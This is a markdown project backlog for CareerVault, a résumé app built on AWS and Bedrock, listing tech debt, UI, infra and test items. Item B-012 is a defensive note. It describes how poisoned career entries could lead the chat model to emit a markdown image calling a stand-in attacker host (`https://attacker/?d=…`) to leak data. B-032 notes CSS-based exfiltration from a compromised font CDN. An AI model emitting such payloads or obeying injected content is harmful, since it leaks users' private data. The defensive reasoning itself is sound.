# CareerVault — Backlog

> Things worth doing that aren't scoped into a numbered slice: UI polish, tech debt,
> follow-ups surfaced by a code review, doc corrections, nice-to-have features. This is
> **not** the roadmap — ordered slice work lives in
> [`careervault-plan.md`](careervault-plan.md). Items here are unordered and may never
> ship; that's fine.
>
> **Lifecycle (this is what keeps it from becoming a junk drawer):**
> - `wrap-slice` appends anything deferred during the slice (code-review findings not
>   fixed in-slice, UI gaps noticed, doc drift spotted).
> - `start-slice` reads this list and either pulls an item into the slice or consciously
>   leaves it — the list gets *looked at* every slice, not just written to.
> - When an item is done, mark it `done` with the slice/PR that closed it, then prune
>   `done` rows once they've been noted in a slice's completion notes.
>
> **Type** ∈ `ui` · `tech-debt` · `feature` · `docs` · `infra` · `test`
> **Priority** ∈ `P1` (do soon) · `P2` (should) · `P3` (someday)
> **Status** ∈ `open` · `in-progress` · `done` · `wontfix`

| ID | Item | Type | Priority | Surfaced in | Status | Notes |
|----|------|------|----------|-------------|--------|-------|
| B-001 | Flesh out the UI — current app is functional but visually basic (styling, layout, empty states, loading/error states, mobile polish). Scope a dedicated design pass; may warrant its own slice. | ui | P2 | post-slice-4 | open | Raised by Oche during post-slice-4 housekeeping. Not covered by any planned slice. **Slice 9 additions:** (1) **NFR-6.2 folded in** — "usable on desktop *and mobile web*" has never been tested at a mobile viewport, so it is scored ❓ Unverified on the MVP scorecard rather than assumed; a responsive pass closes a real requirement, not just polish. (2) **Playwright MCP is now wired up** (checked-in `.mcp.json`, persistent profile at `.playwright-profile/`), so the first concrete step is turning this one line into an enumerated list by actually driving the app at desktop and mobile viewports — including the a11y tree, which no one has ever looked at. |
| B-002 | Reconcile the architecture diagram's ACM Certificate node with reality — slice 4 shipped on the default `*.cloudfront.net` domain and custom domain is deferred, so ACM depicts a future state, not what's deployed. | docs | P2 | post-slice-4 | done | Closed by the post-slice-4 diagram redo (ACM dropped from the current-state diagram). |
| B-003 | Dedup precision for exact-identity entries (CERT/AWARD): ADR-033 semantic cosine (≥0.90) misses "same credential, different wording" — e.g. two AZ-900 certs scored 0.86 and both saved. A structured signal (issuer + normalized credential + date, with date-normalization since Haiku can mis-parse an expiry as the issue date) is more precise. Cross-cutting (chat entry path too), so an ADR-033 amendment, not a slice-5 fix. | feature | P2 | slice-5 | open | Verified by Oche during slice-5 UI test; measured cosine 0.86 < 0.90 (working as designed, not a bug). Consider a per-type threshold and/or structured cert/award identity match. |
| B-004 | Resume agent retrieval loop re-sends its full (growing) message history to Sonnet each iteration — the dominant per-run cost (~70K tokens / $0.31). Explore context compaction: summarise prior tool results, cap the retrieved-entry payload, or (for a small corpus) skip the agentic loop and feed all entries to the draft. Architecture change, not a tune — weigh against ADR-010's "own the loop" learning goal. | tech-debt | P2 | slice-6a | open | Surfaced in 6a advisory review. Tuning (`max_iterations 15→8`, `max_revisions 2→1`) already cut 85K→70K tokens; this is the next lever. Reduces the dominant $ driver vs the $5 ceiling. |
| B-005 | `resume_agent` uses one shared `_MAX_OUTPUT_TOKENS=4096` for all Sonnet phases. Fine for retrieval/critique, but a very rich career history's draft/revise JSON could approach it; today that degrades to `validation_abort` (retry, same cap). Consider a per-phase cap (higher for draft/revise). | tech-debt | P3 | slice-6a | open | Surfaced in 6a advisory review. Not hit in smoke (draft ~1.7K output tokens); robustness only. |
| B-006 | The completed-run metadata row (entries used / critique verdict / tokens / cost) is developer-facing, not user-facing — a real user doesn't need to see `critique: REVISE` or `$0.35`. Gate it behind a debug/dev toggle (or drop it) once the agent is no longer being actively evaluated. | ui | P3 | slice-6b | open | Raised by Oche during the 6b UI smoke: explicitly *wanted* while tuning and evaluating the agent, so keep it visible for now. Revisit at slice 9 hardening or whenever agent tuning settles. |
| B-007 | Total elapsed time vanishes when the résumé renders — the counter only exists during the `generating` phase, so the one moment you'd want to compare runs (right when the result lands) is the moment the number disappears. Carry the final elapsed into the completed-run metadata row. | ui | P3 | slice-6b | done | Raised by Oche during the 6b UI smoke. Pairs with B-006 — same metadata row, same evaluation use case, so do them together. |
| B-008 | Generated résumé has **no identity header** — it renders the literal word "Résumé" where a name/email should be. Root cause traced: the user has **no PROFILE item at all** (`Count: 0` in DDB), so `_contact_from_profile(None)` yields all-None and the template's `{{ contact.name or contact.email or "Résumé" }}` falls to its last fallback. Even with a PROFILE row it would be thin — PROFILE has no `name` field at MVP, and the email lives in the Cognito JWT, not DynamoDB. **Fix corrected 2026-07-28 — the original plan here ("take identity from the JWT claims") is insufficient, verified against the live account.** Cognito holds only `email`, `email_verified`, `sub` — **there is no name attribute**, so JWT alone yields a résumé headed with an email address, which is still not employer-ready. Compounding it, the `Profile` Pydantic model has no `name` and no `location` fields at all — precisely the two `_contact_from_profile` reads. Real fix is three-part: add `name`/`location` to the Profile model, ship `PUT /settings` to write them (`settings_lambda` has had the `UpdateItem` grant since slice 1) with a small identity form, and use the JWT `email` as seed/fallback. | feature | **P1** | slice-6b | **done** | Closed by PR #30 (branch `fix/b008-resume-identity-header`), verified live: saved a name via `PUT /settings`, generated a résumé, header rendered **"Oche Obe"** with `oche.ocheobe@gmail.com · Seattle, Washington` beneath it (run 64.5K tokens / $0.31). The Jinja template needed no change — `contact.name or contact.email or "Résumé"` was correct all along; the data behind it never existed. Raised by Oche after the 6b UI smoke — a résumé with no name on it is not usable output, so this is the highest-value agent fix. Scoped 2026-07-28 after slice 7: doing the **full identity fix** now rather than the email-only shortcut, which pulls forward ~60% of slice 8's `PUT /settings` — committed scope arriving early, not new scope, since slice 8 needs that route for cadence/pause regardless. |
| B-009 | Résumé **format/style is not selectable** — one hard-coded Jinja2 template produces one layout, which isn't the shape Oche would normally use. Offer the user a choice at generation time (e.g. chronological vs skills-first vs one-page condensed), and/or let the agent propose a layout suited to the target role. Template-level change (`resume.html.j2` → several), plus a `format` field on the generate request and the RESUMERUN trace. | feature | P2 | slice-6b | open | Raised by Oche after the 6b UI smoke. **Ruled in slice 9: this is net-new scope, not unfinished FR-5.3.** The earlier note here guessed the opposite. Read literally, FR-5.3 enumerates output *artifacts* — copyable text, HTML preview, downloadable PDF — and says nothing about visual templates, so a layout chooser is a new requirement rather than a gap in an existing one. Separately, **FR-5.4** ("select which output format(s) per request") *is* unmet and is now recorded as a deliberate deferral in requirements v0.6: both artifacts are rendered deterministically from one `ResumeDocument` after the agent finishes, so selecting between them saves no model tokens — it is a UI affordance, not a cost control. |
| B-010 | Switch `resume_agent` from Sonnet 4-6 to **Sonnet 5** once the Bedrock entitlement propagates. The Marketplace agreement was accepted 2026-07-28 (`agreementAvailability` NOT_AVAILABLE → PENDING → AVAILABLE) but `Converse` still returned `AccessDeniedException` ~30 min later on both `us.` and `global.` profiles. When a probe succeeds: flip `SonnetInferenceProfileId`/`SonnetFoundationModelId` in `samconfig.toml` and set `_PRICE_PER_TOKEN["sonnet"]` to `(2.20, 11.00)`. | infra | P2 | slice-6b | **blocked-external** | **Diagnosis complete 2026-07-28 — stop probing.** All four `get-foundation-model-availability` fields are `AVAILABLE`/`AUTHORIZED`, *byte-identical to Sonnet 4-6 which works from the same identity*; the console shows the subscription active; both inference profiles are `ACTIVE`; the only attached SCP is the default `FullAWSAccess`; and all three ID forms (`us.`, `global.`, bare) are still denied at `Converse`. Model ID was verified correct (no version suffix exists). This is a control-plane/data-plane inconsistency, not a misconfiguration — nothing self-serve remains. Most likely reading: "contact AWS Sales" is the wording for a model behind a commercial agreement separate from the Marketplace one, which a low-spend personal account may simply not qualify for. Evidence package + submission routes drafted in [`aws-sonnet-5-access-request.md`](aws-sonnet-5-access-request.md) (account is on **Basic support**, so technical cases are unavailable; use the Sales form or a free Account-category case). Sonnet 5 is **~33% cheaper per token** than 4-6 ($2.20/$11.00 vs $3.30/$16.50 Regional CRIS), so this improves both capability and the $5 posture. Probe with: `aws bedrock-runtime converse --model-id us.anthropic.claude-sonnet-5 …`. See the ADR-036 live-access re-diagnosis. See the ADR-036 live-access re-diagnosis and the request draft above. |

| B-011 | **Hybrid retrieval for aggregate questions** — add a structured-filter branch alongside semantic top-k, so "how many AWS certs do I have?" / "what did I do in 2025?" resolve by deterministic filter (`entry_type`, issuer keyword, `event_date` range) over the in-memory corpus, returning a compact projection (title/date/issuer — no `content`, no embedding) instead of top-k full entries. Wire it to the `intent` field slice 7 ships reserved-but-unimplemented. | feature | P2 | slice-7 | open | Raised by Oche at slice-7 scoping, thinking ahead to users with many certs accumulated over years. Not an architectural hurdle: `query_entries` already reads the whole corpus (paginated), so this is a compression choice, not a retrieval limit — and **no GSI is needed**, ADR-028 holds (one career = tens–low hundreds of items). Slice 7 ships the cheap 80% (corpus census + reserved `intent` field), so this is additive. See ADR-038 "Aggregate questions". |
| B-012 | Keep chat answers rendered as **plain text** — never markdown/HTML. A future "nicer answer formatting" commit (react-markdown, `dangerouslySetInnerHTML`) would reopen an injection exfiltration channel: poisoned entry content could emit `![](https://attacker/?d=…)` and leak on image load. If rich formatting is ever wanted, it needs a sanitizing renderer with images and links disabled, not a drop-in markdown component. | tech-debt | P2 | slice-7 | open | Not a defect — true by construction today (no markdown renderer anywhere in `frontend/src`) and made a tested invariant in slice 7. Logged as a **standing constraint** so the reasoning survives the person who wrote it. One of the four ADR-038 injection controls. |

| B-013 | Every chat Q&A turn does a **full-corpus DynamoDB read including embeddings** — `query_entries` returns each item with its ~1024-float Titan vector (~20 KB/item), so a 13-entry corpus moves ~260 KB per question and a 200-entry one would move ~4 MB, for a chat interaction that only needs the vectors to rank and then discards them. Options: a projection expression that fetches embeddings only (rank first, then `BatchGetItem` the top-k in full), or caching the corpus per warm container. | tech-debt | P3 | slice-7 | open | Surfaced in the slice-7 advisory review. Not a problem at MVP scale (~260 KB, single-digit RCUs, sub-100ms) and the same pattern `career_crud` dedup and `resume_agent` retrieval already use — logging it because it scales with corpus size on the *interactive* path, where latency is felt most. Related to B-004 (agent context growth) but a different layer: this is the DDB read, not the prompt. |

| B-014 | ~~`PUT /settings` replaces the whole nested `settings` object rather than merging into it~~ — DynamoDB partial-update semantics are per *top-level attribute*, so `{"settings":{"checkin_paused":true}}` would drop `checkin_cadence`. `ProfileUpdate` deliberately **omits** `settings` today so the trap cannot be hit; slice 8 must add it together with nested-merge semantics (either a dotted `SET settings.#f = :v` path per sub-field, or read-modify-write) and tests for each sub-field independently. | tech-debt | P2 | b-008 | **done** | Closed by slice 8 (**ADR-040**): one dotted `SET settings.#f = :v` path per sub-field, plus a separate idempotent seeding `UpdateItem` — a dotted path cannot be written into an absent attribute, and the seed *cannot* ride along in the same expression (DynamoDB rejects naming both a path and its descendant: "Two document paths overlap with each other"). All four premises probed against the live table before the ADR was settled; the single-expression form was in the first draft as fact and was wrong. Verified live: writing `settings.checkin_paused` left `settings.checkin_cadence` intact. |

| B-015 | Settings form placeholders use fabricated personal data — `placeholder="Oche Obe"` and `placeholder="Seattle, WA"` in [`frontend/src/settings/Settings.tsx`](../frontend/src/settings/Settings.tsx). Replace with generic examples (`e.g. Ada Lovelace`, `e.g. City, State`). Placeholders are hint text so nothing is saved from them, but a UI suggesting one specific invented name is odd. | ui | P3 | b-008 | **done** | Closed by slice 8: placeholders are now `e.g. Ada Lovelace` / `e.g. City, State`, and the invented dev PROFILE values were cleared so Oche entered his real name and location through the form. Original note: Claude invented "Oche Obe"/"Seattle, WA" during the B-008 smoke test (guessed from the GitHub handle and email) and reused them as placeholders; the values also got written into the dev PROFILE row. Oche asked to fold the placeholder fix into the next slice start. **Also check** whether the dev PROFILE `name`/`location` still hold those invented values. |

| B-016 | A **failed SES send still consumes the check-in cycle** — the slot claim writes `next_checkin_at` before `SendEmail`, so a transient SES failure marks the user as sent and defers the next nudge a full cadence. Consider narrowing the window: claim, send, and on send failure roll `next_checkin_at` back (accepting that a crash between the two leaves it claimed), or retry the send in-invocation before giving up. | tech-debt | P3 | slice-8 | open | Not a defect — it is the price of the §3.3.4 ordering, which exists to stop a Scheduler retry duplicating the email. Idempotency buys "at most once" by giving up "at least once"; no ordering yields both. Logged because the trade is right for a *nudge* and would be wrong for anything transactional, and the reasoning should be re-derived rather than inherited if the pattern is copied. See ADR-039 consequences. |
| B-017 | **Test harness: sibling modules are still resolved off a shared `sys.path`.** `load_handler` now isolates handler loads (slice 8), but seven test modules also `sys.path.insert` a function directory permanently to import siblings directly (`from rendering import ...`), so two functions owning a same-named module can still shadow each other depending on collection order. Give those tests the same isolation, or import siblings by path. | test | P3 | slice-8 | **done** | Closed by slice 9. Added `load_sibling()` alongside `load_handler()` (both now share one `_load_isolated()`), converted the four modules that bare-imported a sibling (`qa`, `agent`, `rendering`, `extraction`), and deleted three *vestigial* inserts that referenced no sibling at all — `load_handler` had already made them unnecessary. Two findings worth carrying. **(1) Loading a module by path requires registering it in `sys.modules` *before* `exec_module`.** `agent.py` declares dataclasses at module scope, and class construction resolves its own defining module via `sys.modules[cls.__module__]`; unregistered, that yields `None` and the class body dies with `AttributeError: 'NoneType' object has no attribute '__dict__'` — an error naming neither the module nor the cause. `load_handler` never hit it only because no handler declares such a type at module level. **(2) The eviction protects `load_handler`, not `load_sibling`** — `agent.py` imports no siblings, so the first regression test written against it had no teeth and passed with the fix removed. The real collision pair is `resume_agent/handler.py:49` and `checkin/handler.py:47`, both doing `from rendering import ...`. `tests/unit/test_harness_isolation.py` now pins it by asserting each handler's bound `render_html.__code__.co_filename` comes from its own directory; **mutation-verified** — disabling the eviction fails 2 of its 6 tests. Original note: surfaced when `checkin/rendering.py` shadowed `resume_agent/rendering.py`. |
| B-018 | **No integration test covers the check-in flow** — slice 8 was verified by hand (forced invokes, a temporary entry-date flip to force the personalized tier, the SES mailbox simulator for bounces, manual state resets between runs). That sequence is repeatable but undocumented outside the slice notes, and every future change to the scheduled path re-runs it manually or not at all. | test | P2 | slice-8 | **done** | Closed by slice 9, split by what is separable rather than covered wholesale. The **decision half** — due users by `Scan`, slot claim, cadence pacing for all four FR-4.1 windows, pause/resume — runs against DynamoDB Local in the free tier ([`test_checkin_scheduling.py`](../tests/integration/local/test_checkin_scheduling.py)): that is the half slice 8 verified by hand and the half that regressed. The **deployed half** invokes the real `checkin` Lambda, but only after reading live state and skipping if any real user is due — `_process_user` runs only for due users, so a no-due run calls no Bedrock and sends no email while still executing `scan_profiles()`, which is what exercises the `dynamodb:Scan` grant arch v2.1 added to §4.5.4. The **composition half** (real Haiku, the ADR-021 tier-downgrade bug) sits in the `--bedrock` tier at ~$0.01. Deliberately *not* covered: an actual SES send, because a test whose assertion is "an email arrived" is a test nobody can run twice. |
| B-019 | **Bounce/complaint state has no UI, no alarm, and no automated response — and must be closed before SES production access.** `bounce_count` / `last_bounce_at` / `complained_at` are written, and `CheckinsBounced` / `CheckinsComplained` are emitted, but **nothing alarms on either metric** and nothing reads the state: `is_due()` never consults `bounce_count`, so a permanently-bouncing address keeps being sent to indefinitely. A user whose address hard-bounces sees nothing in the app and keeps a schedule that will never deliver. §3.3.8 defers auto-pause to v1.1; at minimum the settings page could surface "we couldn't deliver your last check-in". | feature | P2 | slice-8 | open | Deliberate MVP scope (§3.3.8), logged so the gap is a decision rather than an oversight. Auto-pause is the tempting fix and the risky one: the first thing it does when it misfires is silently stop a working feature. **Re-framed after the slice-8 code review (2026-07-29), on two counts.** (1) The prose said "written and alarmed on" and the `ses_event_handler` docstring said "records, counts, and alarms" — neither was true; no alarm on a custom metric existed anywhere in the stack. Docstring corrected in-place, this row corrected here. (2) Raised P3→P2 because the real deadline is not "a user is confused" but **SES production access**: in the sandbox this is harmless (one self-owned verified recipient), and the moment sandbox is exited, repeated hard bounces become an account-reputation liability AWS can act on. This is a precondition on leaving the sandbox, not a UI nicety to schedule after it. |

| B-020 | **Reduce résumé-generation latency (~176s).** Requirements §7.4 originally promised "within 30 seconds"; slice 9 corrects the criterion to a measured target, but the *goal* behind it stands — generation time is the most user-visible weakness of the flagship feature. Levers, roughly by value-per-risk: **(a) `ConverseStream` + progressive render** — does not reduce total time but collapses *perceived* latency, and for a 176s job perceived time is arguably the real defect; **(b) Bedrock prompt caching** on the stable corpus/system prefix — cuts time-to-first-token across every retrieval iteration and is the same lever as B-004's cost fix; **(c) skip the agentic retrieval loop for small corpora** — feeding ~13 entries straight to the draft removes several sequential round-trips outright; **(d) Haiku for the critique phase** instead of Sonnet; **(e) show the draft at ~T+60s before critique/revise finish**, letting the résumé improve in place; **(f) Sonnet 5** (B-010) is faster as well as ~33% cheaper. | feature | **P2** | slice-9 | open | Raised by Oche at slice-9 scoping when accepting the §7.4 correction: "reducing the time it takes to generate resumes" is something users would appreciate and was always in scope. **Shares a root cause with B-004** — the retrieval loop re-sending a growing history is simultaneously the dominant cost driver *and* the dominant latency driver, so (b) and (c) pay twice; treat the two items together rather than separately. Note (a) and (e) are UX changes that make the wait *feel* shorter without making it shorter — worth doing regardless, and cheapest by far, but they should not be mistaken for having fixed the underlying number. Weigh (c) against ADR-010's explicit "own the loop" learning goal before implementing. **Evidence added 2026-07-29 (slice 9):** the `--expensive` integration run measured **72s / 20,183 tokens / $0.113 on a 2-entry corpus with a `REVISE` critique**, against slice 6b's **176s / 82.9K tokens / $0.35 for a `REVISE` run on the real 13-entry corpus**. Same verdict and same phases, so this is not a cheaper code path — **latency and cost both scale with corpus size**, confirming the retrieval loop's growing history (B-004) as the shared mechanism and making (b) and (c) the two levers that pay twice. Note the corollary for the ceiling: a *fuller* career history costs and takes proportionally more, so this gets worse as the app is used as intended. |

| B-021 | **A prod stack cannot deploy alongside dev — the SES email identity collides.** [`CheckinEmailIdentity`](../infrastructure/template.yaml) creates an `AWS::SES::EmailIdentity` from `CheckinSenderAddress` (default `oche.ocheobe@gmail.com`), which is **not** environment-suffixed — unlike `CheckinConfigurationSet` directly below it (`careervault-checkins-${Environment}`). An SES identity is unique per account+region and the dev stack already owns this one, so `sam deploy --config-env prod` fails at `AWS::EarlyValidation::ResourceExistenceCheck` before creating anything. Fix options: (a) give prod its own sender address (a Gmail `+` alias verifies as a distinct identity, so `oche.ocheobe+careervault-prod@gmail.com` costs nothing but needs a **manual verification click**); (b) make the identity conditional so only one stack owns it and the other references it; (c) move the identity out of the template into a one-time bootstrap. | infra | P2 | slice-9 | open | Found by the ADR-041 prod dry run — the specific value that justified running it, and not the thing it was run to check. Diagnosis was conclusive rather than inferred: `describe-stack-events` and `describe-change-set-hooks` both returned nothing useful, so the identical template was re-run with only `CheckinSenderAddress` changed and the change set then built cleanly (70 resources, including the prod-gated billing alarms, which do validate). **Not urgent under ADR-041** — dev is the MVP and no prod stack is planned — but it is a blocker the moment that reverses, and the reversal case (a second user) is exactly when nobody wants to debug CloudFormation. Note (b) is the only option that avoids a manual step, and it makes the two stacks non-independent, which is its own cost. |

| B-022 | **No copyable plain-text résumé bullets.** FR-5.3 offers three outputs — copyable bullets, HTML preview, downloadable PDF — and slice 6 shipped the last two. A user who wants to paste tailored bullets into a résumé they already maintain has no path: they must read them off an iframe or a PDF. Cheap to add, since `ResumeDocument` already holds the bullets as structured data and the rendering is deterministic — this is a "copy to clipboard" affordance over data that already exists, not new generation. | feature | P2 | slice-9 | done | Surfaced by the slice-9 FR audit. FR-5.3's "AND/OR" wording means 2 of 3 satisfies it as written, so this is a **usability** gap rather than a compliance one — logged because "technically met" is exactly how a real gap stays invisible. Arguably the highest value-per-effort item in the backlog: most people tailoring a résumé already have one. |
| B-023 | **Interactive latency (NFR-2.1, NFR-2.3) has never been measured.** Ingestion is specified at ≤5s and dashboard load at ≤2s; neither has a number attached. Per-turn *cost* is known (~$0.006 for chat Q&A) because it shows up on the bill — latency has no equivalent forcing function, which is why it went unmeasured for nine slices. Add timing to the integration suite's free tier (deployed-Lambda round-trips are already invoked there, so this is instrumentation rather than new tests). | test | P2 | slice-9 | open | Surfaced by the slice-9 NFR audit as ❓ Unverified — deliberately distinguished from "fails". Related to **B-013**: every Q&A turn reads the whole corpus *including ~1024-float embeddings per entry*, so the interactive path is the one that degrades first as the corpus grows, and it is currently the one with no measurement at all. |
| B-024 | **Check-in emails verified in Gmail only.** NFR-6.3 requires correct rendering in Gmail, Outlook, and Apple Mail; slice 8 verified Gmail. Outlook is the material risk — its rendering engine is the historical reason HTML email uses table layouts and inline styles, so a template that looks right everywhere else can still break there. The email ships a plain-text alternative part, which bounds the worst case to "ugly, not unreadable". | ui | P3 | slice-9 | open | Surfaced by the slice-9 NFR audit. Cheap partial fix: render [`checkin.html.j2`](../backend/functions/checkin/templates/checkin.html.j2) to a file and check it in a desktop Outlook client, no send required. Full fix means a cross-client rendering service, which is disproportionate for a single-user app whose one user reads mail in Gmail — a good candidate for **wontfix** if that stays true. |

| B-025 | **A misconfigured environment produces a green integration run that executed nothing.** `aws_session` is session-scoped, so one `pytest.skip` inside it silently skips all 13 `cloud` tests, all 5 `bedrock` tests and the `--expensive` test at once; `run-integration.sh` exits 0 and "N passed, 19 skipped" reads as success. The whole point of those tiers is catching what only the deployed artifact exposes (IAM grants, layer resolution, env vars), so a run that reports success without exercising any of it is exactly the invisible-degradation shape ADR-021's addendum was written about. Options: a `--require-cloud` flag that turns skips into failures, or **failing rather than skipping on *wrong account*** — absence of credentials is a legitimate skip, but pointing at the wrong AWS account is misconfiguration and should be loud. | test | P2 | slice-9 | open | Surfaced by the slice-9 advisory code review. The skip-don't-fail behaviour is deliberate and stays right as the default (a developer without Docker or SSO should still get signal from the rest); the gap is that nothing distinguishes "skipped because unavailable" from "skipped because broken". Cheap first step: print a summary line naming which tiers were skipped and why. |
| B-026 | **Two incompatible `api_event`/`body_of` helpers are on `sys.path` at once.** [`tests/helpers.py`](../tests/helpers.py) defines `api_event(body, *, sub=…, method=…)` for unit tests; [`tests/integration/_helpers.py`](../tests/integration/_helpers.py) defines `api_event(*, method, user_id, body, …)` for the deployed tiers. Both directories are importable simultaneously, and `bedrock/test_real_model_calls.py` imports from **both modules in one file** — so `from helpers import api_event` instead of `from _helpers import api_event` is a one-character mistake that yields a silently wrong event shape rather than an ImportError. Also dead: `FUNCTIONS["chat"]` is never used because callers pass `"careervault-chat-dev"` literally, bypassing the map that exists to hold that string. | tech-debt | P3 | slice-9 | open | Surfaced by the slice-9 advisory code review. Not a live bug — the current imports are correct — but the failure mode is silent and the two names are one underscore apart. Fix is either a single shared builder parameterised by what differs (claims vs. `sub`), or renaming the integration one to something unmistakable like `proxy_event`. Prefer the rename: the two really do serve different callers, and merging them risks a helper that serves neither well. |
| B-027 | **TypeScript majors are pinned back by typescript-eslint's peer range.** [`dependabot.yml`](../.github/dependabot.yml) now carries `ignore: typescript / semver-major` on the npm entry, so `typescript` is held at 6.x. **Trigger to lift it: typescript-eslint publishes a release whose peer range admits TypeScript 7.** | tech-debt | P3 | v1.1-slice-1 | open | Surfaced by the start-slice Dependabot sweep (2026-08-07), PR #38 closed. typescript-eslint 8.65 peers on `typescript >=4.8.4 <6.1.0`, so a TS 6.0.2 → 7.0.2 bump fails `npm ci` at resolution. The `lint-toolchain` group is atomic *by design* (peer-coupled packages must move together), which means that one unresolvable major also blocked eslint 10.7→10.8, globals 17.7→17.8 and typescript-eslint 8.64→8.65 riding alongside it — the ignore un-sticks those. **This is upstream-blocked, not misgrouped:** the grouping is correct and no config change can fix it, only an upstream release. Check with `npm view typescript-eslint peerDependencies`. |
| B-028 | **The Résumés view has no data source, and a TTL that fights it.** The redesign specifies a grid of past résumés ("Built 12 Jul 2026 · 9 records drawn"), but the API exposes only `POST /resumes/generate` and `GET /resumes/{run_id}` — **there is no list endpoint** — and `RESUMERUN` items carry a **30-day TTL**, so even with one, history could not reach back further than a month. Needs a decision before the Résumés view can be honestly built: extend/remove the TTL, split a durable `RESUME#` item from the ephemeral run trace, or accept a rolling 30-day window and say so in the UI. | feature | **P1** | v1.1-slice-1 | done | Surfaced by the pre-redesign audit. **Blocks the Résumés view**, and is why that view was split out of v1.1 slice 2 into **slice 3 of its own** (2026-08-08): slice 2 is otherwise a pure frontend diff, and this is a data-model decision needing an ADR, a new API route and integration tests. It is also why Home's third stat card ships as "Longest streak" instead of "Résumés built" (ADR-045). Note the TTL is not incidental: ADR-015 was *amended* at slice 6b to make résumé artifact retention a flat 30 days precisely to match this TTL, so changing it reopens that decision too. |
| B-029 | **Promote Home's aggregates to an endpoint when the corpus makes derivation hurt.** ADR-045 derives the stat trio, year grid, category weights and streak client-side from `GET /entries`. Trigger to revisit: a corpus large enough that per-load derivation is felt, or a second consumer needing the same numbers. The view's data shape is designed not to change when it moves. | tech-debt | P3 | v1.1-slice-1 | open | Deliberate deferral recorded at the moment of the decision, not discovered later. Related to B-013 (the same `GET /entries` read carries full embeddings) — if that is fixed first, derivation gets cheaper and this trigger recedes further. |
| B-030 | **The gap-analysis line on Home has no implementation.** The design specifies "Light on certifications — three of your last four résumé targets asked for one" and explicitly says to generate it from real gap analysis rather than hardcode it. Needs résumé target history (blocked on B-028) plus an inference; a per-load Bedrock call is the wrong shape against a $5 ceiling where Bedrock is already 87% of spend. Consider a heuristic over entry-type counts, or a cached value computed at résumé-generation time. | feature | P2 | v1.1-slice-1 | open | Omitted from v1.1 slice 1 per ADR-045 rather than faked — B-015 is the precedent for why fabricated content is logged as a defect, not shipped as a placeholder. |
| B-031 | **CareerVault has no logo mark — the header is wordmark-only.** The design handoff specified a 26×26 gradient square beside the wordmark (and a 44×44 version on the sign-in screen), but it was a placeholder for a mark that has never existed. Removed in v1.1 slice 1 rather than shipped as decoration. If a real mark is ever made, the slot is `.brand` in `App.tsx` and the `--grad-logo` token is still defined for it. | ui | P3 | v1.1-slice-1 | open | Raised by Oche on review of the Home build: a meaningless square reads worse than none. Removing it had one non-obvious consequence worth remembering — the wordmark had been hidden below 768px to make room for the square, so dropping the square would have left the header with *no* branding on mobile. The wordmark now shows at every width and the streak pill hides below 600px instead. |
| B-032 | **Self-host Figtree and JetBrains Mono instead of loading them from Google Fonts.** [`index.css`](../frontend/src/index.css) carries `@import url("https://fonts.googleapis.com/…")` — the first and only external subresource the app loads. Downloading the two woff2 files into `frontend/src/assets/fonts/` and declaring `@font-face` locally removes a third-party dependency from the render path. | infra | P3 | v1.1-slice-1 | **done** | Closed by v1.1 slice 2. Four woff2 files (latin + latin-ext for each family, 73 KB total) vendored into `frontend/src/assets/fonts/`; both families are **variable**, so one file per subset covers every weight the design uses and the `@font-face` blocks declare `font-weight: 400 700` rather than one block per weight. The four unused JetBrains Mono subsets (cyrillic, cyrillic-ext, greek, vietnamese) were deliberately not vendored. Verified: zero `https://` references remain in any stylesheet. The NFR-2.3 win was not measured and should not be assumed — `GET /entries` at 3639ms remains the dominant term in the 3686ms cold load. | Raised by the slice-1 security review as a **below-threshold** note, not a finding — the practice is near-universal and there is no concrete exploit. Three reasons it is still worth doing: `@import` admits no SRI and the app sets no CSP (no `ResponseHeadersPolicy` in the SAM template), so a compromised font CDN could serve arbitrary CSS — which cannot execute script but can exfiltrate via attribute-selector background URLs; Google Fonts logs viewer IPs, which is a privacy consideration for an app holding career history; and it is a render-blocking third-party round trip on a page whose cold load already misses NFR-2.3. The handoff specifies the Google Fonts URL, so this is a deviation to record when made. |

| B-033 | **"Warn me before the streak breaks" reminder has no implementation.** The Details view specifies a toggle (defaulting on) for "a nudge the day before the period closes". Nothing behind it exists: no settings field, and no second scheduled send — `checkin_lambda` fires once per cadence period, at the period boundary, not before it. Needs a `settings.streak_warning` field written through ADR-040's dotted-path merge, plus either a second EventBridge schedule or an `is_due()` variant computing a pre-boundary window, plus integration coverage for the new window. | feature | P3 | v1.1-slice-2 | open | Deferred at slice-2 scoping with Oche (2026-08-08) rather than faked. Shipping the toggle alone was explicitly considered and rejected: a switch that persists but sends nothing is fabricated functionality, which **B-015** set the precedent against. Worth doing **together with B-019** — both are check-in *delivery* gaps, both touch the same Lambda, and B-019's bounce state is arguably the more valuable of the two since a permanently-bouncing address currently keeps being sent to forever. Note the interaction: a streak warning to a bouncing address is two failures compounding silently. |
| B-034 | **No account deletion.** The Details data card specifies "close the account" beside Export. A real implementation spans three services — delete the Cognito user, delete every `USER#<user_id>` item from DynamoDB (a query-then-`BatchWriteItem` over all SK prefixes, since ADR-027's hard-delete path is per-entry), and delete the `uploads/`/`resumes/` S3 objects — with a confirm gate, and it is irreversible by construction (PITR aside). | feature | P3 | v1.1-slice-2 | open | Deferred at slice-2 scoping (2026-08-08): disproportionate for a single-user MVP whose one user is the developer, and the riskiest possible thing to build against an account holding the only copy of the career history the app exists to protect. **Its real trigger is multi-tenancy, not polish** — the moment a second user exists, "delete my data" stops being a UI affordance and becomes a data-protection obligation, which is also when the per-user deletion sweep needs to be correct rather than convenient. Related: ADR-006/007 (single-user MVP, multi-tenant-ready data model) — the single-table design makes the sweep tractable, since one user is one partition. |
| B-035 | **Résumé export exists as JSON but not the reverse.** Slice 2 ships a client-side JSON export of every entry (`GET /entries` → `Blob` download) per the Details data card. There is no *import* of that file — a user who exports, edits, and wants to restore has no path back in except re-typing or re-uploading a résumé through the parser. | feature | P3 | v1.1-slice-2 | open | Logged at the moment the asymmetry was created rather than discovered later. Not obviously worth building: the export's stated purpose on the design's own data card is "your vault, your data" — portability and escape, not round-tripping — and an import path raises validation questions (duplicate IDs, embedding regeneration on write per ADR-024, schema drift across versions) that the export does not. Revisit if a real restore need appears, or alongside **B-034**, where export-then-delete is the natural pairing. |

